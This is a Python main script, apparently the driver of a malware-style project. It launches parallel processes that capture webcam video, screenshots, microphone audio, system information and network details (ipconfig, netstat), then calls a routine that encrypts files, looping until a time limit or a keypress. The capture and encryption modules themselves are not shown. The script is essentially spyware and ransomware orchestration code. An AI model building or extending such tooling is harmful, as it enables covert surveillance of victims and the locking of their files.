import traceback
import time
import keyboard
from multiprocessing import Process
from Features.CmdPrompts.CmdPrompts import CmdPrompts
from Features.Webcamera.Webcamera import Webcamera
from Features.Screenshot.Screenshot import Screenshot
from Features.Soundfile.Soundfile import Soundfile
from Features.SystemInformation.SystemInformation import SystemInformation
from Util.FileEncryption import FileEncryption
from Util.DataClass import DataClass

import os


class MainFileException(Exception):
    pass


exit_program = False


class Main(DataClass):
    def __init__(self):
        super().__init__()  # Call the base class __init__ method
        self.end_time = self.end_time

    @staticmethod
    def run_feature(feature_class, feature_method):
        feature = feature_class()
        method = getattr(feature, feature_method)
        method()

    def main(self):
        try:
            processes = [
                Process(target=self.run_feature, args=(CmdPrompts, 'ipconfig_all')),
                Process(target=self.run_feature, args=(CmdPrompts, 'netstat_ano')),
                Process(target=self.run_feature, args=(Webcamera, 'record_screen')),
                Process(target=self.run_feature, args=(Screenshot, 'screenshot')),
                Process(target=self.run_feature, args=(Soundfile, 'audio_recording')),
                Process(target=self.run_feature, args=(SystemInformation, 'system_information')),
                Process(target=self.run_feature, args=(FileEncryption, 'encrypt_files')),
            ]

            # Start the processes
            for process in processes:
                process.start()

            # Wait for all processes to finish
            for process in processes:
                process.join()

        except Exception as error:
            raise MainFileException(f"Main failed to run") from error


if __name__ == '__main__':
    print(os.getcwd())
    main = Main()

    try:
        while time.time() < main.end_time and not exit_program:
            main.main()
            if keyboard.is_pressed('q'):
                exit_program = True
                print("Program has been terminated")
                break

    except MainFileException as e:
        print(f"Main failed to run: {e}")
        print(f"Original error: {e.__cause__}")
        traceback.print_exc()
    finally:
        pass
